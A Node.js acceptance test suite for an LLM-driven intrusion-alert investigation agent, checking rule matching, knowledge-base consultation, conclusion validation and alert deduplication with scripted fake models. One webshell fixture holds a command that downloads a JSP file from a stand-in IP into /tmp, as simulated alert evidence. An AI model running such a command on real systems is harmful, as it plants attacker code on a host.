// P003-T012 后端验收（黑盒）：只按 docs/modules/investigation-agent.md §3.8 / §4 与
// docs/modules/triage-pipeline.md 写断言，不参考实现文件内容。
// 跑法：node --test evidence/p003-t012-verify/acceptance.test.js
// 全局根隔离（P003-T050 A2）：必须是本文件第一个 import——它要在 wiki-store.js / rule-store.js 求值前把
// HIDS_DATA_DIR 指到本进程的临时根，否则 `new WikiStore()` 的缺省目录会整目录种子进真全局根（实测影子根 209 条目）。
import { assertIsolatedRoot } from '../test/P003-T034/isolate-data-root.js';
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { InvestigationAgent } from '../../investigation-agent.js';
import { AgentToolbox } from '../../agent-tools.js';
import { RuleStore } from '../../rule-store.js';
import { WikiStore } from '../../wiki-store.js';
import { InvestigationStore } from '../../investigation-store.js';
import { TriageMonitor } from '../../triage-monitor.js';
import { KnowledgeStore } from '../../knowledge-store.js';
import { KnowledgeWorkbench, knowledgeFields } from '../../knowledge-workbench.js';

const REVIEW_OK = { assessment: 'supported', concerns: [], missing_evidence: [] };

test('全局根隔离（P003-T050 A2）：本文件的数据根是临时根，不是真实全局根', () => assertIsolatedRoot());

// 按脚本触发工具调用；tools 为空数组的那次调用是独立复核（doc §3.3）。
function scriptedModel(steps) {
  let index = 0;
  const toolResults = [];
  const log = [];
  const model = {
    model: 'fake',
    toolResults,
    log,
    complete: async (messages, tools) => {
      const last = messages.at(-1);
      if (last?.role === 'tool') toolResults.push(String(last.content));
      if (tools.length === 0) {
        log.push('review');
        return { content: JSON.stringify(REVIEW_OK) };
      }
      const step = steps[index++];
      if (!step) throw new Error(`脚本已用完（第 ${index} 次工具轮次）`);
      log.push(step.tool ?? 'json');
      if (step.json) return { content: JSON.stringify(step.json) };
      return { tool_calls: [{ id: `call-${index}`, type: 'function',
        function: { name: step.tool, arguments: JSON.stringify(step.args ?? {}) } }] };
    }
  };
  return model;
}

function toolboxFor(type, original) {
  return new AgentToolbox({
    listTools: async () => [{ name: `get_${type}_event`,
      inputSchema: { type: 'object', properties: { id: { type: 'number' } }, required: ['id'] } }],
    callTool: async () => original
  });
}

const suspiciousEvent = { id: 7, host_view: { host_id: 41, host_ip: '10.0.0.5' }, cmdline: 'id' };

function syslogContext(payload, msgid = 'cloudwalker-honeypot') {
  return {
    parsed: { msgid, ts: '2026-11-03T08:00:00Z', payload },
    context: {}, match: { matched: false }, caseInfo: { files: [] }
  };
}

const CLAIM = [{ text: '执行了 id 命令', citations: [{ evidence_id: 'cw:1', pointer: '/cmdline', value: 'id' }] }];

// ---------------------------------------------------------------- A1

test('A1 真规则库命中：整段 Rego 进系统提示，verdict.rego/trace 同口径', async () => {
  let system = '';
  const model = { model: 'fake', complete: async (messages, tools) => {
    if (!tools.length) return { content: JSON.stringify(REVIEW_OK) };
    system = messages[0].content;
    return { content: JSON.stringify({ verdict: '存疑', summary: '需核查来源', claims: [], missing_data: [] }) };
  } };
  const result = await new InvestigationAgent(toolboxFor('honeypot',
    { id: 7, source_ip: '192.0.2.2', host_ip: '10.0.0.5' }), model, undefined, null, new RuleStore('rules'))
    .run('honeypot:7', { mode: 'triage', streamContext: syslogContext({
      host_ip: '10.0.0.5', source_ip: '192.0.2.2', target_ip: '10.0.0.5', user_name: 'root' }) });

  assert.match(system, /# 套上的 Rego 规则/);
  assert.match(system, /honeypot_probe/);
  assert.match(system, /package hids\.rules\.honeypot_probe/);
  assert.match(system, /规则只说明字段命中/);
  assert.deepEqual(result.verdict.rego, { status: 'matched', rule_ids: ['honeypot_probe'] });
  assert.deepEqual(result.trace.find(item => item.kind === 'rego'),
    { kind: 'rego', status: 'matched', rule_ids: ['honeypot_probe'] });
});

test('A1 未命中：上下文写明没有套上的规则，status=none', async () => {
  let system = '';
  const model = { model: 'fake', complete: async (messages, tools) => {
    if (!tools.length) return { content: JSON.stringify(REVIEW_OK) };
    system = messages[0].content;
    return { content: JSON.stringify({ verdict: '存疑', summary: '需核查来源', claims: [], missing_data: [] }) };
  } };
  const result = await new InvestigationAgent(toolboxFor('honeypot',
    { id: 7, source_ip: '192.0.2.2' }), model, undefined, null, new RuleStore('rules'))
    .run('honeypot:7', { mode: 'triage', streamContext: syslogContext({
      host_ip: '10.0.0.5', source_ip: '192.0.2.2', target_ip: '10.0.0.5', user_name: 'ops' }) });

  assert.match(system, /本次没有套上的 Rego 规则（规则库对本次告警事实求值无命中）/);
  assert.doesNotMatch(system, /honeypot_probe/);
  assert.deepEqual(result.verdict.rego, { status: 'none', rule_ids: [] });
});

test('A1 边界：载荷缺 target_ip 时 peer 不进事实，依赖 peer 非空的规则套不上', async () => {
  let system = '';
  const model = { model: 'fake', complete: async (messages, tools) => {
    if (!tools.length) return { content: JSON.stringify(REVIEW_OK) };
    system = messages[0].content;
    return { content: JSON.stringify({ verdict: '存疑', summary: '需核查来源', claims: [], missing_data: [] }) };
  } };
  const result = await new InvestigationAgent(toolboxFor('honeypot',
    { id: 7, source_ip: '192.0.2.2' }), model, undefined, null, new RuleStore('rules'))
    .run('honeypot:7', { mode: 'triage', streamContext: syslogContext({
      host_ip: '10.0.0.5', source_ip: '192.0.2.2', user_name: 'root' }) });

  assert.deepEqual(result.verdict.rego, { status: 'none', rule_ids: [] });
  assert.match(system, /本次没有套上的 Rego 规则/);
});

test('A1 deep 模式没有 syslog 事实：not_applicable，上下文写明没有可求值事实', async () => {
  let system = '';
  const model = { model: 'fake', complete: async (messages, tools) => {
    if (!tools.length) return { content: JSON.stringify(REVIEW_OK) };
    system = messages[0].content;
    return { content: JSON.stringify({ verdict: '存疑', summary: '需核查来源', claims: [], missing_data: [] }) };
  } };
  const result = await new InvestigationAgent(toolboxFor('honeypot', { id: 7, source_ip: '192.0.2.2' }),
    model, undefined, null, new RuleStore('rules')).run('honeypot:7', { mode: 'deep' });

  assert.match(system, /没有可求值的 syslog 告警事实/);
  assert.deepEqual(result.verdict.rego, { status: 'not_applicable', rule_ids: [] });
});

test('A1 规则库读不了：status=unavailable，研判不中断且原因进上下文', async () => {
  let system = '';
  const model = { model: 'fake', complete: async (messages, tools) => {
    if (!tools.length) return { content: JSON.stringify(REVIEW_OK) };
    system = messages[0].content;
    return { content: JSON.stringify({ verdict: '存疑', summary: '需核查来源',
      claims: [{ text: '来源地址为 192.0.2.2',
        citations: [{ evidence_id: 'cw:1', pointer: '/source_ip', value: '192.0.2.2' }] }],
      missing_data: [] }) };
  } };
  const broken = new RuleStore(path.join(tmpdir(), `hids-no-such-rules-${process.pid}-${Date.now()}`));
  const result = await new InvestigationAgent(toolboxFor('honeypot', { id: 7, source_ip: '192.0.2.2' }),
    model, undefined, null, broken).run('honeypot:7', { mode: 'triage',
    streamContext: syslogContext({ host_ip: '10.0.0.5', source_ip: '192.0.2.2', target_ip: '10.0.0.5', user_name: 'root' }) });

  assert.equal(result.verdict.rego.status, 'unavailable');
  assert.deepEqual(result.verdict.rego.rule_ids, []);
  assert.match(system, /规则库求值失败：/);
  assert.equal(result.validation.ok, true);
});

// ---------------------------------------------------------------- A2

test('A2 真判据库：wiki_page 后 submit_conclusion 采纳，consulted/adopted/reason 落结果', async () => {
  const model = scriptedModel([
    { tool: 'wiki_page', args: { id: 'SC-15' } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '需核查命令授权', wiki_adopted: ['SC-15'],
      claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model,
    undefined, new WikiStore(), new RuleStore('rules')).run('suspicious_operation:7', { mode: 'triage' });

  assert.deepEqual(result.verdict.wiki, { consulted: ['SC-15'], adopted: ['SC-15'], reason: '' });
  const conclusion = result.trace.find(item => item.kind === 'conclusion');
  assert.equal(conclusion.tool, 'submit_conclusion');
  assert.equal(conclusion.summary_chars, [...result.verdict.summary].length);
  assert.deepEqual(conclusion.adopted, ['SC-15']);
  assert.equal(result.trace.some(item => item.kind === 'wiki' && item.id === 'SC-15'), true);
  assert.equal(model.log.includes('review'), true);
});

test('A2 真判据库：wiki_search 的每条命中都记进 consulted', async () => {
  const model = scriptedModel([
    { tool: 'wiki_search', args: { keyword: '授权' } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '需核查命令授权', wiki_adopted: ['SC-15'],
      claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model,
    undefined, new WikiStore(), new RuleStore('rules')).run('suspicious_operation:7', { mode: 'triage' });

  // 注入临时根后按仓内种子读：`wiki/common/GEN-13.md`（applies_to: [common]）也在命中里。
  // 曾写成 ['GEN-12','SC-15']——那能绿只因本机真全局根里的 wiki/ 副本还停在加 GEN-13 之前，属假绿。
  assert.deepEqual([...result.verdict.wiki.consulted].sort(), ['GEN-12', 'GEN-13', 'SC-15']);
  assert.deepEqual(result.verdict.wiki.adopted, ['SC-15']);
});

test('A2 三条硬校验：未查先交、采纳未查页、未采纳又不写原因都被退回', async () => {
  const model = scriptedModel([
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '先交结论' } },
    { tool: 'wiki_page', args: { id: 'SC-15' } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '采纳未查页', wiki_adopted: ['GEN-12'] } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '不采纳也不写原因', wiki_adopted: [] } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '不采纳并写明原因', wiki_adopted: [],
      wiki_reason: '判据页与本告警证据边界不符', claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model,
    undefined, new WikiStore(), new RuleStore('rules')).run('suspicious_operation:7', { mode: 'triage' });

  // 三次被退各自消耗一次工具调用，第五次才收下
  assert.deepEqual(model.log.filter(entry => entry !== 'review').length, 5);
  assert.match(model.toolResults[0], /没有调用知识库工具/);
  assert.match(model.toolResults[3], /必须写明采纳了哪一页/);
  assert.deepEqual(result.verdict.wiki,
    { consulted: ['SC-15'], adopted: [], reason: '判据页与本告警证据边界不符' });
});

test('A2 模型直接吐 JSON 的兼容路径：先催一轮知识库，未调用也照收但写下缺口', async () => {
  const direct = { verdict: '存疑', summary: '直接给结论', claims: CLAIM, missing_data: [] };
  const model = scriptedModel([{ json: direct }, { json: direct }]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model,
    undefined, new WikiStore(), new RuleStore('rules')).run('suspicious_operation:7', { mode: 'triage' });

  assert.equal(result.trace.some(item => item.kind === 'wiki' && item.action === 'required'), true);
  assert.match(result.verdict.wiki.reason, /知识库工具/);
  assert.equal(result.verdict.missing_evidence.some(item => /知识库/.test(item)), true);
  assert.equal(result.verdict.wiki.consulted.length, 0);
});

test('A1/A2 捷径：命中已审核客户经验时 rego 与主路径同口径，wiki 写明未调用知识库工具', async t => {
  const directory = await mkdtemp(path.join(tmpdir(), 'hids-t012-reuse-'));
  t.after(() => rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }));
  const store = new KnowledgeStore(directory);
  const created = await store.create();
  await store.update(created.id, current => {
    current.status = 'ready_for_review';
    current.fields = Object.fromEntries(knowledgeFields.map(([key]) =>
      [key, { value: `${key} 核对完毕`, source_quote: `${key} 核对完毕` }]));
    current.fields.reason.value = '已核对本次登录授权';
    return current;
  });
  const published = await new KnowledgeWorkbench(store, null, null).publish(created.id, {
    scenario_id: 'webshell', note: '已人工核对原始告警与落地脚本授权范围',
    valid_until: new Date(Date.now() + 30 * 86400000).toISOString().slice(0, 10)
  });
  assert.equal(published.status, 'published');

  const original = { event_id: 7, host_view: { host_id: 41, host_name: 'app-7' },
    file_path: '/tmp/a.jsp', process_command_line: 'curl -o /tmp/a.jsp http://192.0.2.2/a.jsp' };
  const toolbox = new AgentToolbox({
    listTools: async () => [{ name: 'get_webshell_event',
      inputSchema: { type: 'object', properties: { id: {} }, required: ['id'] } }],
    callTool: async () => original
  });
  let calls = 0;
  const model = { model: 'fake', complete: async () => {
    calls++;
    return { content: JSON.stringify({ case_id: created.id, matched: true, summary: '同一来源已授权登录',
      claims: [
        { text: '落地文件为 /tmp/a.jsp',
          citations: [{ evidence_id: 'cw:1', pointer: '/file_path', value: '/tmp/a.jsp' }] },
        { text: '落地命令为 curl 写入',
          citations: [{ evidence_id: 'cw:1', pointer: '/process_command_line',
            value: 'curl -o /tmp/a.jsp http://192.0.2.2/a.jsp' }] }
      ], unverified_conditions: [], conflicts: [] }) };
  } };
  const result = await new InvestigationAgent(toolbox, model, undefined, store, new RuleStore('rules'))
    .run('webshell:7', { mode: 'triage', streamContext: syslogContext({
      host_ip: '10.0.0.5', source_ip: '192.0.2.2', file_path: '/tmp/a.jsp' },
      'cloudwalker-webshell') });

  assert.equal(calls, 1, '命中捷径只调一次模型');
  assert.equal(result.review.assessment, 'knowledge_reuse');
  assert.equal(result.knowledge_reuse.case_id, created.id);
  assert.deepEqual(result.verdict.rego, { status: 'matched', rule_ids: ['webshell_drop'] });
  assert.deepEqual(result.verdict.wiki,
    { consulted: [], adopted: [], reason: '命中已审核经验捷径，未调用知识库工具' });
});

// ---------------------------------------------------------------- A3

test('A3 submit_conclusion 正文边界：空正文与 501 字被退，500 字收下', async () => {
  const model = scriptedModel([
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '' } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '警'.repeat(501) } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '警'.repeat(500), claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model)
    .run('suspicious_operation:7', { mode: 'deep' });

  assert.deepEqual(model.log.filter(entry => entry !== 'review').length, 3);
  assert.match(model.toolResults[1], /500/);
  assert.equal([...result.verdict.summary].length, 500);
  assert.equal(result.validation.ok, true);
  const conclusion = result.trace.find(item => item.kind === 'conclusion');
  assert.deepEqual({ tool: conclusion.tool, summary_chars: conclusion.summary_chars },
    { tool: 'submit_conclusion', summary_chars: 500 });
});

test('A3 500 字按字符计：500 个四字节字符收下（UTF-16 长度 1000）', async () => {
  const model = scriptedModel([
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '😀'.repeat(500), claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model)
    .run('suspicious_operation:7', { mode: 'deep' });

  assert.equal([...result.verdict.summary].length, 500);
  assert.equal(result.verdict.summary.length, 1000);
  assert.equal(result.trace.find(item => item.kind === 'conclusion').summary_chars, 500);
});

test('A3 deep 模式忽略 wiki_adopted/wiki_reason：不因未查知识库被拒', async () => {
  const model = scriptedModel([
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '正文', wiki_adopted: ['GEN-12'],
      claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model)
    .run('suspicious_operation:7', { mode: 'deep' });

  assert.equal(result.validation.ok, true);
  assert.equal(result.verdict.wiki, undefined);
  assert.equal(result.verdict.verdict, 'uncertain');
});

test('A3 结论必须是三态：缺 verdict 与表外写法被退回，不落库', async () => {
  const model = scriptedModel([
    { tool: 'submit_conclusion', args: { summary: '缺 verdict' } },
    { tool: 'submit_conclusion', args: { verdict: '随便写的结论', summary: '表外写法' } },
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '合法结论', claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model)
    .run('suspicious_operation:7', { mode: 'deep' });

  assert.deepEqual(model.log.filter(entry => entry !== 'review').length, 3);
  assert.match(model.toolResults[0], /verdict 必须是/);
  assert.match(model.toolResults[1], /verdict 必须是/);
  assert.equal(result.verdict.verdict, 'uncertain');
  assert.equal(result.verdict.summary, '合法结论');
});

// ---------------------------------------------------------------- 结果形状（doc §3.7 / §4）

test('结果形状：run() 必备字段与枚举值符合文档', async () => {
  const model = scriptedModel([
    { tool: 'submit_conclusion', args: { verdict: '存疑', summary: '正文', claims: CLAIM } }
  ]);
  const result = await new InvestigationAgent(toolboxFor('suspicious_operation', suspiciousEvent), model,
    undefined, null, new RuleStore('rules')).run('suspicious_operation:7', { mode: 'deep' });

  for (const key of ['alert_id', 'mode', 'model', 'prompt_version', 'scenario_ids', 'verdict', 'review',
    'validation', 'trace', 'required_evidence', 'evidence', 'auto_action'])
    assert.equal(key in result, true, `缺字段 ${key}`);
  assert.equal(result.auto_action, false);
  assert.ok(['matched', 'none', 'unavailable', 'not_applicable'].includes(result.verdict.rego.status));
  assert.ok(['supported', 'needs_revision', 'unavailable', 'knowledge_reuse'].includes(result.review.assessment));
  assert.equal(typeof result.validation.ok, 'boolean');
  assert.ok(Array.isArray(result.validation.errors));
  // deep 与 triage 同一套生成必查项（P003-T035，docs/modules/investigation-agent.md:411-413：「改前 deep 恒为空数组」）。
  // 本用例的替身工具箱只给 `get_suspicious_operation_event`，三项清单工具都没有 → 全部 source_unavailable。
  assert.deepEqual(result.required_evidence.map(item => item.id),
    ['related_events', 'command_history', 'authorization']);
  const five = ['records_returned', 'empty_page', 'source_unavailable', 'missing_identifier', 'query_failed'];
  for (const item of result.required_evidence) {
    assert.equal(typeof item.label, 'string', `缺 label：${item.id}`);
    assert.equal(typeof item.tool, 'string', `缺 tool：${item.id}`);
    assert.equal(typeof item.scope, 'string', `缺 scope：${item.id}`);
    assert.ok(five.includes(item.status), `status 不在五态里：${item.id}=${item.status}`);
  }
  assert.equal(result.required_evidence.find(item => item.id === 'authorization').catalog_absent, true,
    '本次 MCP 目录没有 authorization_record → 标 catalog_absent');
  // 缺口只进 verdict.missing_evidence，且 catalog_absent 那项不算缺口（docs:456）；deep 不写客户报告。
  assert.equal(result.verdict.missing_evidence.length, 2);
  assert.equal(result.verdict.missing_evidence.join('\n').includes('操作授权'), false);
  assert.ok(Array.isArray(result.evidence) && result.evidence.length >= 1);
  assert.equal(typeof result.evidence[0].evidence_id, 'string');
  assert.equal(typeof result.evidence[0].sha256, 'string');
});

// ---------------------------------------------------------------- A4（回归，走公开入口 acceptSyslog）

test('A4 同主机同事件秒同告警只研判一次，重复投递只累加 repeat_count', async t => {
  const directory = await mkdtemp(path.join(tmpdir(), 'hids-t012-a4-'));
  t.after(() => rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }));
  const runs = [];
  const history = new InvestigationStore(path.join(directory, 'investigations'));
  const monitor = new TriageMonitor({
    service: {}, inputMode: 'syslog', concurrency: 1, history,
    file: path.join(directory, 'state.json'), casesDirectory: path.join(directory, 'cases'),
    eventToolbox: { listEvents: async () => ({ total: 1, events: [
      { id: 7, started_at: Math.floor(Date.parse('2026-11-03T08:00:00Z') / 1000) }] }) },
    wiki: { agentIndex: async () => ({ pages: [] }) },
    investigator: { run: async (id, { mode }) => {
      runs.push({ id, mode });
      return { alert_id: id, mode, verdict: { verdict: 'uncertain', verdict_label: '存疑', summary: '存疑',
        report: '待核查。', claims: [], missing_evidence: [], next_actions: [] },
      validation: { ok: true }, trace: [] };
    } }
  });
  await monitor.start();
  const raw = '<134>1 2026-11-03T08:00:00Z host app 1 cloudwalker-honeypot '
    + 'host_ip="10.0.0.5" event_create_time="2026-11-03 08:00:00" source_ip="192.0.2.2" target_port="80"';
  const first = await monitor.acceptSyslog(raw);
  const duplicate = await monitor.acceptSyslog(raw);
  assert.equal(duplicate.collapsed, true);
  assert.equal(duplicate.repeat_count, 2);
  assert.equal(duplicate.alert_id, first.alert_id);
  for (let n = 0; n < 200 && monitor.status(first.alert_id)?.status !== 'done'; n++)
    await new Promise(resolve => setTimeout(resolve, 5));
  assert.equal(monitor.status(first.alert_id).status, 'done');
  assert.equal(runs.length, 1, '重复投递不得再研判一次');
  assert.equal((await history.latest('honeypot:7', 'triage')).repeat_count, 2);
  assert.match(await readFile(path.join(monitor.status(first.alert_id).case_dir, '05-研判结果.md'), 'utf8'),
    /重复投递：2 次/);

  // 跨事件秒、同指纹、上一条已完结 → 复用结论（docs/modules/triage-pipeline.md:285-291、
  // triage-monitor.js:875-893）：不新建记录、不再研判一次，只累加 repeat_count。
  // 卡面说的「跨秒另建记录」是上一条未完结时的分支，真要走那条得另造一个没收尾的记录。
  const crossSecond = raw.replace('08:00:00" source_ip', '08:00:01" source_ip');
  const other = await monitor.acceptSyslog(crossSecond);
  assert.equal(other.reused, true, '同指纹 + 已完结 → 复用结论');
  assert.equal(other.alert_id, first.alert_id, '复用不新建记录');
  assert.equal(other.repeat_count, 3, '第三次投递累计到 3');
  assert.equal(runs.length, 1, '复用结论不得再跑一次研判');
  assert.equal((await history.latest('honeypot:7', 'triage')).repeat_count, 3, '研判记录里的次数跟着回写');
});
